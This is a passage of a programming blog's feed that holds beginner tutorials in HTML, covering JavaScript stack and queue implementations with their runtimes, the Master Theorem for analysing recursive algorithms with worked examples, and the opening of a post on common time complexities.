<p>As you can see is very easy since we are using the built-in <code>Array.push</code> and <code>Array.pop</code>. Both have a runtime of <em><code>O(1)</code></em>.</p>
<p>Let‚Äôs see some examples of its usage:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> stack = <span class="keyword">new</span> Stack();</span><br><span class="line"></span><br><span class="line">stack.push(<span class="string">'a'</span>);</span><br><span class="line">stack.push(<span class="string">'b'</span>);</span><br><span class="line">stack.push(<span class="string">'c'</span>);</span><br><span class="line"></span><br><span class="line">stack.pop(); <span class="comment">// c</span></span><br><span class="line">stack.pop(); <span class="comment">// b</span></span><br><span class="line">stack.pop(); <span class="comment">// a</span></span><br></pre></td></tr></table></figure>
<p>The first in (<code>a</code>) as the last to get out. We can also implement stack using a linked list instead of an array. The runtime will be the same.</p>
<p>That‚Äôs all!</p>
<h1 id="Queues">Queues<a href="#Queues" class="headerlink" title="Queues"></a></h1><!-- https://docs.oracle.com/javase/10/docs/api/java/util/Queue.html -->
<!-- https://stackoverflow.com/a/22615787/684957 -->
<p>Queues is a data structure where the first data to get in is also the first to go out. A.k.a First-in, First-out (FIFO).
It‚Äôs like a line of people at the movies, the first to come in is the first to come out.</p>
<img src="/images/queue.jpg" title="Queue: enqueue and dequeue">
<p>We could implement a Queue using an array, very similar to how we implemented the Stack.</p>
<h2 id="Queue-implemented-with-Array-s">Queue implemented with Array(s)<a href="#Queue-implemented-with-Array-s" class="headerlink" title="Queue implemented with Array(s)"></a></h2><p>A naive implementation would be this one using <code>Array.push</code> and <code>Array.shift</code>:</p>
<p><a id="QueueNaiveImpl"></a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.input = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(element) &#123;</span><br><span class="line">    <span class="keyword">this</span>.input.push(element);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  remove() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.input.shift();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>What‚Äôs the time complexity of <code>Queue.add</code> and <code>Queue.remove</code>?</p>
<ul>
<li><code>Queue.add</code> uses <code>array.push</code> which has a constant runtime. Win!</li>
<li><code>Queue.remove</code> uses <code>array.shift</code> which has a linear runtime. Can we do better than <em><code>O(n)</code></em>?</li>
</ul>
<p>Think a way you can implement a Queue only using <code>Array.push</code> and <code>Array.pop</code>.</p>
<p><a id="QueueArrayImpl"></a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.input = [];</span><br><span class="line">    <span class="keyword">this</span>.output = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(element) &#123;</span><br><span class="line">    <span class="keyword">this</span>.input.push(element);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  remove() &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>.output.length) &#123;</span><br><span class="line">      <span class="keyword">while</span>(<span class="keyword">this</span>.input.length) &#123;</span><br><span class="line">        <span class="keyword">this</span>.output.push(<span class="keyword">this</span>.input.pop());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.output.pop();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now we are using two arrays rather than one.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> queue = <span class="keyword">new</span> Queue();</span><br><span class="line"></span><br><span class="line">queue.add(<span class="string">'a'</span>);</span><br><span class="line">queue.add(<span class="string">'b'</span>);</span><br><span class="line"></span><br><span class="line">queue.remove() <span class="comment">// a</span></span><br><span class="line">queue.add(<span class="string">'c'</span>);</span><br><span class="line">queue.remove() <span class="comment">// b</span></span><br><span class="line">queue.remove() <span class="comment">// c</span></span><br></pre></td></tr></table></figure>
<p>When we remove something for the first time, the <code>output</code> array is empty. So, we insert the content of <code>input</code> backward like <code>[&#39;b&#39;, &#39;a&#39;]</code>. Then we pop elements from the <code>output</code> array. As you can see, using this trick we get the output in the same order of insertion (FIFO).</p>
<p>What‚Äôs the runtime?</p>
<p>If the output already has some elements, then the remove operation is constant <em><code>O(1)</code></em>. When the output arrays need to get refilled, it takes <em><code>O(n)</code></em> to do so. After the refilled, every operation would be constant again. The amortized time is <em><code>O(1)</code></em>.</p>
<p>We can achieve a <code>Queue</code> with a pure constant if we use a LinkedList. Let‚Äôs see what it is in the next section!
<!-- **[[usages]]** --></p>
<h2 id="Queue-implemented-with-a-Doubly-Linked-List">Queue implemented with a Doubly Linked List<a href="#Queue-implemented-with-a-Doubly-Linked-List" class="headerlink" title="Queue implemented with a Doubly Linked List"></a></h2><p>We can achieve the best performance for a <code>queue</code> using a linked list rather than an array.</p>
<p><a id="QueueListImpl"></a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> LinkedList = <span class="built_in">require</span>(<span class="string">'../linked-lists/linked-list'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.input = <span class="keyword">new</span> LinkedList();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(element) &#123;</span><br><span class="line">    <span class="keyword">this</span>.input.addFirst(element);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  remove() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.input.removeLast();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  get size() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.input.size;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Using a doubly linked list with the last element reference we achive an <code>add</code> of <em>O(1)</em>. That‚Äôs the importance of using the right tool for the right job üí™</p>
<h1 id="Summary">Summary<a href="#Summary" class="headerlink" title="Summary"></a></h1><p>We a explored the most of the linear data structures. We saw that depending on how we implement the data structures there are different runtimes.</p>
<p>Here‚Äôs a summary of everything that we explored. You can click on each runtime, and it will take you to the implementation.
<!-- there is not a generic runtime for the operations because it depends more  --></p>
<p><strong>Time complexity</strong></p>
<p><em>Click on the <strong>name</strong> to go the section or click on the <strong>runtime</strong> to go the implementation</em></p>
<p><code>*</code> = Amortized runtime</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Insert</th>
<th>Access</th>
<th>Search</th>
<th>Delete</th>
<th>Comments</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="#Array"><strong>Array</strong></a></td>
<td><a href="#Insert-element-on-an-array"><em>O(n)</em></a></td>
<td><a href="#Access-an-element-in-an-array"><em>O(1)</em></a></td>
<td><a href="#Search-an-element-in-an-array"><em>O(n)</em></a></td>
<td><a href="#Deleting-elements-from-an-array"><em>O(n)</em></a></td>
<td>Insertion to the end is <code>O(1)</code>. <a href="#Array-operations-time-complexity">Details here.</a></td>
</tr>
<tr>
<td><a href="#HashMaps">(Hash)<strong>Map</strong></a></td>
<td><a href="#Insert-element-on-a-HashMap-runtime">*O(1)**</a></td>
<td><a href="#Search-Access-an-element-on-a-HashMap-runtime">*O(1)**</a></td>
<td><a href="#Search-Access-an-element-on-a-HashMap-runtime">*O(1)**</a></td>
<td><a href="#Edit-Delete-element-on-a-HashMap-runtime">*O(1)**</a></td>
<td>Rehashing might affect insertion time. <a href="#HashMap-operations-time-complexity">Details here.</a></td>
</tr>
<tr>
<td><strong>Map</strong> (using Binary Search Tree)</td>
<td><em>O(log(n))</em></td>
<td>-</td>
<td><em>O(log(n))</em></td>
<td><em>O(log(n))</em></td>
<td>Implemented using Binary Search Tree</td>
</tr>
<tr>
<td><a href="#Sets"><strong>Set</strong> (using HashMap)</a></td>
<td>*<a href="#Set-Implementation">O(1)</a>**</td>
<td>-</td>
<td>*<a href="#Set-Implementation">O(1)</a>**</td>
<td>*<a href="#Set-Implementation">O(1)</a>**</td>
<td>Set using a HashMap implementation. <a href="#Set-Operations-runtime">Details here.</a></td>
</tr>
<tr>
<td><strong>Set</strong> (using Binary Search Tree)</td>
<td><em>O(log(n))</em></td>
<td>-</td>
<td><em>O(log(n))</em></td>
<td><em>O(log(n))</em></td>
<td>Implemented using Binary Search Tree</td>
</tr>
<tr>
<td><a href="#Singly-Linked-Lists"><strong>Linked List</strong> (singly)</a></td>
<td><em><a href="#SinglyLinkedList.addLast">O(n)</a></em></td>
<td>-</td>
<td><em><a href="#LinkedList.contains">O(n)</a></em></td>
<td><em><a href="#LinkedList.remove">O(n)</a></em></td>
<td>Adding/Removing to the start of the list is <em><code>O(1)</code></em>. <a href="#Singly-Linked-Lists-time-complexity">Details here</a>.</td>
</tr>
<tr>
<td><a href="#Doubly-Linked-Lists"><strong>Linked List</strong> (doubly)</a></td>
<td><em><a href="#DoublyLinkedList.add">O(n)</a></em></td>
<td>-</td>
<td><em><a href="#LinkedList.contains">O(n)</a></em></td>
<td><em><a href="#LinkedList.remove">O(n)</a></em></td>
<td>Adding/Deleting from the beginning/end is <em><code>O(1)</code></em>. But, deleting/adding from the middle is <em><code>O(n)</code></em>. <a href="#Doubly-Linked-Lists-time-complexity">Details here</a></td>
</tr>
<tr>
<td><a href="#Stacks"><strong>Stack</strong> (array implementation)</a></td>
<td><em><a href="#Stacks">O(1)</a></em></td>
<td>-</td>
<td>-</td>
<td><em><a href="#Stacks">O(1)</a></em></td>
<td>Insert/delete is last-in, first-out (LIFO)</td>
</tr>
<tr>
<td><a href="#QueueNaiveImpl"><strong>Queue</strong> (naive array impl.)</a></td>
<td><em><a href="#QueueNaiveImpl">O(n)</a></em></td>
<td>-</td>
<td>-</td>
<td><em><a href="#QueueNaiveImpl">O(1)</a></em></td>
<td>Insert (<code>Array.shift</code>) is <em>O(n)</em></td>
</tr>
<tr>
<td><a href="#QueueArrayImpl"><strong>Queue</strong> (array implementation)</a></td>
<td>*<a href="#QueueArrayImpl">O(1)</a>**</td>
<td>-</td>
<td>-</td>
<td><em><a href="#QueueArrayImpl">O(1)</a></em></td>
<td>Worst time insert is <em>O(n)</em>. However amortized is <em>O(1)</em></td>
</tr>
<tr>
<td><a href="#QueueListImpl"><strong>Queue</strong> (list implementation)</a></td>
<td><em><a href="#QueueListImpl">O(1)</a></em></td>
<td>-</td>
<td>-</td>
<td><em><a href="#QueueListImpl">O(1)</a></em></td>
<td>Using Doubly Linked List with reference to the last element.</td>
</tr>
</tbody>
</table>
<p>Note: <strong>Binary search trees</strong> and trees in general will be cover in the next post. Also, graph data structures.</p>
<!-- Links

http://bigocheatsheet.com/

http://cooervo.github.io/Algorithms-DataStructures-BigONotation/

https://medium.freecodecamp.org/time-is-complex-but-priceless-f0abd015063c

https://code.tutsplus.com/tutorials/data-structures-with-javascript-whats-a-data-structure--cms-23347


Arrays:

Time complexity table for Arrays and dynamic DS
https://en.wikipedia.org/wiki/Linked_list#Linked_lists_vs._dynamic_arrays

JavaScript runtime complexity of Array functions
https://stackoverflow.com/a/22615787/684957


Backlinks:

https://www.reddit.com/r/compsci/comments/8m1dx0/data_structures_for_beginners_arrays_hashmaps_and/

https://adrianmejia.com/blog/2018/04/28/data-structures-time-complexity-for-beginners-arrays-hashmaps-linked-lists-stacks-queues-tutorial/
2„ÄÅÂêÑÁßçÊï∞ÊçÆÁªìÊûÑÁöÑ JavaScript ÂÆûÁé∞ÔºàËã±ÊñáÔºâ

https://www.yuque.com/ruanyf/share/issue-10
-->
]]></content>
    
    <summary type="html">
    
      &lt;!-- Data Structures Time Complexity for Beginners --&gt;
&lt;p&gt;When we are developing software, we have to store data in memory. Depending on how you want to manipulate the data, you might choose a data structure over another. There are many types of data types such as arrays, maps, sets, lists, trees, graphs, etc. Choosing the right data structure for a task can be tricky. So, this post will help you know the trade-offs so you can always use the right tool for the job.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Data Structures and Algorithms (DSA)" scheme="https://adrianmejia.com/categories/Programming/Data-Structures-and-Algorithms-DSA/"/>
    
    
      <category term="big-o notation" scheme="https://adrianmejia.com/tags/big-o-notation/"/>
    
      <category term="algorithms" scheme="https://adrianmejia.com/tags/algorithms/"/>
    
      <category term="tutorial_algorithms" scheme="https://adrianmejia.com/tags/tutorial-algorithms/"/>
    
  </entry>
  
  <entry>
    <title>Analysis of Recursive Algorithms</title>
    <link href="https://adrianmejia.com/blog/2018/04/24/Analysis-of-Recursive-Algorithms/"/>
    <id>https://adrianmejia.com/blog/2018/04/24/Analysis-of-Recursive-Algorithms/</id>
    <published>2018-04-24T12:44:35.000Z</published>
    <updated>2018-04-24T12:44:35.000Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>



<p>Analyzing the running time of non-recursive algorithms is pretty straightforward. You count the lines of code, and if there are any loops, you multiply by the length. However, recursive algorithms are not that intuitive. They divide the input into one or more subproblems. On this post, we are going to learn how to get the big O notation for most recursive algorithms.</p>
<a id="more"></a>
<p>We are going to explore how to obtain the time complexity of recursive algorithms. For that, we are going to use the <strong>Master Theorem</strong> (or master method).
<!-- One is the **Master Theorem** and other is the **Recursion Tree**.  --></p>
<hr>
<p>This post is part of a tutorial series:</p>
<p><strong>Learning Data Structures and Algorithms (DSA) for Beginners</strong></p>
<ol>
<li><p><a href="/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/">Intro to algorithm‚Äôs time complexity and Big O notation</a></p>
<!-- 1. Intro to Algorithm's Time Complexity and Big O Notation **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/">Eight time complexities that every programmer should know</a></p>
<!-- 1. Eight time complexities that every programmer should know **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/28/Data-Structures-Time-Complexity-for-Beginners-Arrays-HashMaps-Linked-Lists-Stacks-Queues-tutorial/">Data Structures for Beginners: Arrays, HashMaps, and Lists</a></p>
<!-- 1. Data Structures for Beginners: Arrays, HashMaps, and Lists **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/">Graph Data Structures for Beginners</a></p>
<!-- 1. Graph Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/06/11/Data-Structures-for-Beginners-Trees-binary-search-tree-tutorial/">Trees Data Structures for Beginners</a></p>
<!-- 1. Trees Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/07/16/self-balanced-binary-search-trees-with-avl-tree-data-structure-for-beginners/">Self-balanced Binary Search Trees</a></p>
<!-- 1. Self-balanced Binary Search Trees  **üëà you are here** -->
</li>
<li><p>Appendix I: Analysis of Recursive Algorithms <strong>üëà you are here</strong></p>
<!-- 1. [Appendix I: Analysis of Recursive Algorithms](/blog/2018/04/24/Analysis-of-Recursive-Algorithms/) -->
</li>
</ol>
<hr>
<h1 id="Master-Theorem">Master Theorem<a href="#Master-Theorem" class="headerlink" title="Master Theorem"></a></h1><p>The Master Theorem is the easiest way of obtaining runtime of recursive algorithms. First, you need to identify three elements:</p>
<ul>
<li><em><code>a</code></em>: Subproblems. How many recursion (split) functions are there? E.g., the Binary search has 1 split, Merge Sort has 2 split, etc.</li>
<li><em><code>b</code></em>: Relative subproblem size. What rate is the input reduced? E.g., Binary search and Merge sort cut input in half.</li>
<li><em><code>f(n)</code></em> Runtime of the work done outside the recursion? E.g. `O(n)` or `O(1)`</li>
</ul>
<p>The general formula for the Master Theorem is:</p>
<blockquote>
<p>` T(n) = a * T(n / b) + f(n) `</p>
</blockquote>
<p>Once, we have <code>a</code>, <code>b</code> and <code>f(n)</code> we can determine the runtime of the work done by the recursion. That is given by:</p>
<blockquote>
<p>` O(n^(log_b a)) `</p>
</blockquote>
<p>Finally, we compare the runtime of the split/recursion functions and <em><code>f(n)</code></em>. There are 3 possible cases:</p>
<p><strong>Case 1</strong> Recursion/split runtime is higher: `n^(log_b a) &gt; f(n)`</p>
<blockquote>
<p>Final runtime: `O(n^(log_b a))`</p>
</blockquote>
<p><strong>Case 2</strong> Same runtime inside and outside recursion: `n^(log_b a) ~~ f(n)`</p>
<blockquote>
<p>Final runtime: `O(n^(log_b a) log n)`</p>
</blockquote>
<p><strong>Case 3:</strong> Recursion/split runtime is lower: `n^(log_b a) &lt; f(n)`</p>
<blockquote>
<p>Final runtime: `O(f(n))`</p>
</blockquote>
<p>These 3 cases might see a little abstract at first, but after a few examples, it will be more evident.</p>
<h1 id="Master-Theorem-Examples">Master Theorem Examples<a href="#Master-Theorem-Examples" class="headerlink" title="Master Theorem Examples"></a></h1><p>In the [previous post])(/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/) we used Master Method to get the time complexity for the <a href="/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/#Binary-search">binary search</a> and <a href="/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/#Mergesort">merge sort</a>. Both of them fall into the case 2. Let‚Äôs explore some other examples.</p>
<h2 id="Case-1-Example">Case 1 Example<a href="#Case-1-Example" class="headerlink" title="Case 1 Example"></a></h2><p>What‚Äôs the runtime of this recursion?</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recursiveFn1</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(!n) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">return</span> recursiveFn1(n/<span class="number">4</span>) + recursiveFn1(n/<span class="number">4</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>1)</strong> Let‚Äôs identify <code>a</code>, <code>b</code> and <code>f(n)</code> from the Master Theorem</p>
<ul>
<li>Sub-problems? 2, so <code>a=2</code></li>
<li>Sub-problems size? it‚Äôs 1/4 of the original <code>n</code> size, thus <code>b=4</code></li>
<li>Runtime without recursion? Constant, therefore <code>f(n) = 1</code>.</li>
</ul>
<p>Substituting the values we get:</p>
<p>` T(n) = a * T(n / b) + f(n) `</p>
<p>` T(n) = 2 * T(n / 4) + 1 `</p>
<p><strong>2)</strong> What‚Äôs the runtime of the recursion by itself? Using the formula, we get:</p>
<p>` n^(log_b a) `</p>
<p>` n^(log_4 2) = n^0.5 = sqrt(n)`</p>
<p><strong>3)</strong> Comparing <code>f(n)</code> with the result in step 2, we see that it matches case 1.</p>
<p>Since `O(n^0.5) &gt; O(1)` then the runtime is:</p>
<p>` O(n^(log_b a)) `</p>
<p>` O(n^(log_4 2)) `</p>
<blockquote>
<p>`  O(sqrt(n)) `</p>
</blockquote>
<h2 id="Case-2-Example">Case 2 Example<a href="#Case-2-Example" class="headerlink" title="Case 2 Example"></a></h2><p>What would be the runtime of the mergesort if instead of splitting the array in 2 we split it up in 3?</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> length = n.length;</span><br><span class="line"> <span class="comment">// base case</span></span><br><span class="line"> <span class="keyword">if</span>(length === <span class="number">1</span>) &#123;</span><br><span class="line"> <span class="keyword">return</span> n;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">if</span>(length === <span class="number">2</span>) &#123;</span><br><span class="line"> <span class="keyword">return</span> n[<span class="number">0</span>] &gt; n[<span class="number">1</span>] ? [n[<span class="number">1</span>], n[<span class="number">0</span>]] : [n[<span class="number">0</span>], n[<span class="number">1</span>]];</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="comment">// slit and merge</span></span><br><span class="line"> <span class="keyword">const</span> third = length/<span class="number">3</span>;</span><br><span class="line"> <span class="keyword">return</span> merge(</span><br><span class="line"> sort(n.slice(<span class="number">0</span>, third)),</span><br><span class="line"> sort(n.slice(third, <span class="number">2</span> * third)),</span><br><span class="line"> sort(n.slice(<span class="number">2</span> * third))</span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a = [], b = [], c = []</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> merged = [];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">let</span> ai = <span class="number">0</span>, bi = <span class="number">0</span>, ci = <span class="number">0</span>; ai &lt; a.length || bi &lt; b.length || ci &lt; c.length;) &#123;</span><br><span class="line"> <span class="keyword">const</span> nonNullValues = [a[ai], b[bi], c[ci]].filter(<span class="function"><span class="params">x</span> =&gt;</span> x === <span class="number">0</span> || x );</span><br><span class="line"> <span class="keyword">const</span> min = <span class="built_in">Math</span>.min.apply(<span class="literal">null</span>, nonNullValues);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(min === a[ai]) &#123;</span><br><span class="line"> merged.push(a[ai++]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(min === b[bi]) &#123;</span><br><span class="line"> merged.push(b[bi++]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> merged.push(c[ci++]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> merged;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>So, this new implementation divides the input into 3 subproblems (<code>a = 3</code>). The input size is divided by 3 (<code>b=3</code>). The work to <code>merge</code> the 3 sub-problems is still <code>O(n)</code>.</p>
<p><strong>1)</strong> Using the Master Theorem, we get:</p>
<p>` T(n) = a * T(n / b) + f(n) `</p>
<p>` T(n) = 3 * T(n / 3) + n `</p>
<p><strong>2)</strong> Let‚Äôs compute the amount of work done in the recursion:</p>
<p>` n^(log_b a) `</p>
<p>` n^(log_3 3) = n `</p>
<p><strong>3)</strong> Since <code>f(n)</code> and the recursive work is the same: <code>n</code>, we are looking at the <em>case 2</em>. Thus, the runtime is:</p>
<p>`O(n^(log_b a) log n)`</p>
<p>`O(n^(log_3 3) log n)`</p>
<blockquote>
<p>`O(n log n)`</p>
</blockquote>
<p>It‚Äôs the same as merge sort dividing the input into 2 subproblems and half <code>n</code>.</p>
<h2 id="Case-3-Example">Case 3 Example<a href="#Case-3-Example" class="headerlink" title="Case 3 Example"></a></h2><p>The case 3 of the Master Method is not very common in real life. It implies that most of the work is done in the base case of the recursion. If most work is done outside the recursion, it means that we can re-write the code in a non-recursive way.</p>
<p>Anyways, let‚Äôs solve this example:</p>
<p><strong>1)</strong> ` T(n) = 3 * T(n / 2) + n^2 `</p>
<ul>
<li>a=3</li>
<li>b=2</li>
<li>f(n) = n^2</li>
</ul>
<p><strong>2)</strong> Calculate recursive work:</p>
<p>` n^(log_2 3) `</p>
<p>` n^(1.48) `</p>
<p><strong>3)</strong> Since <em><code>f(n)</code></em> is bigger than the recursive work we have:</p>
<blockquote>
<p>` O(n^2) `</p>
</blockquote>
<h1 id="Master-Method-Exceptions">Master Method Exceptions<a href="#Master-Method-Exceptions" class="headerlink" title="Master Method Exceptions"></a></h1><p>The master method is handy but there are certain cases when you cannot use it.</p>
<ul>
<li><em><code>T(n)</code></em> is not monotone. E.g. ` T(n) = sin n`.</li>
<li><em><code>f(n)</code></em> is not polynomial. E.g. ` T(n) = 2 * T(n/2) + 2^n `.</li>
<li><em><code>b</code></em> cannot be expressed as a constant. E.g. ` T(n) = 2 * T(sqrt(n)) + n `.</li>
</ul>
<p>For these cases, you would have to recursion tree method or substitution method. We are going to explore these methods in future posts after covering the fundamentals.</p>
<h1 id="Summary">Summary<a href="#Summary" class="headerlink" title="Summary"></a></h1><p>On this post, we provided the tools to quickly obtain the runtime of recursive algorithms that split input by a constant factor. We covered the Master Method and provided examples for each one of its possible cases.</p>
]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML&quot; async&gt;&lt;/script&gt;



&lt;p&gt;Analyzing the running time of non-recursive algorithms is pretty straightforward. You count the lines of code, and if there are any loops, you multiply by the length. However, recursive algorithms are not that intuitive. They divide the input into one or more subproblems. On this post, we are going to learn how to get the big O notation for most recursive algorithms.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Data Structures and Algorithms (DSA)" scheme="https://adrianmejia.com/categories/Programming/Data-Structures-and-Algorithms-DSA/"/>
    
    
      <category term="big-o notation" scheme="https://adrianmejia.com/tags/big-o-notation/"/>
    
      <category term="algorithms" scheme="https://adrianmejia.com/tags/algorithms/"/>
    
      <category term="tutorial_algorithms" scheme="https://adrianmejia.com/tags/tutorial-algorithms/"/>
    
  </entry>
  
  <entry>
    <title>8 time complexities that every programmer should know</title>
    <link href="https://adrianmejia.com/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/"/>
    <id>https://adrianmejia.com/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/</id>
    <published>2018-04-05T20:10:09.000Z</published>
    <updated>2019-02-21T23:21:03.396Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Summary">Summary<a href="#Summary" class="headerlink" title="Summary"></a></h1><p>We are going to learn the top algorithm‚Äôs running time that every developer should be familiar with. Knowing these time complexities will help you to assess if your code will scale. Also, it‚Äôs handy to compare different solutions for the same problem. At the end, you would be able to estimate which one will perform better.</p>
<a id="more"></a>
<p>In the <a href="/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/">previous post</a>, we saw how Alan Turing saved millions of lives with an optimized algorithm. In most cases, faster algorithms can save you time, money and enabled new technology. So, this is a paramount to know how to measure algorithms performance.</p>
<p>To recap <strong>time complexity</strong> estimates how an algorithm performs regardless kind of machine it runs on. You can get the time complexity by ‚Äúcounting‚Äù the number of operations performed by your code. This time complexity is defined as a function of the input size <code>n</code> using Big-O notation. <code>n</code> indicates the magnitude of the input while O is the growth rate function.</p>
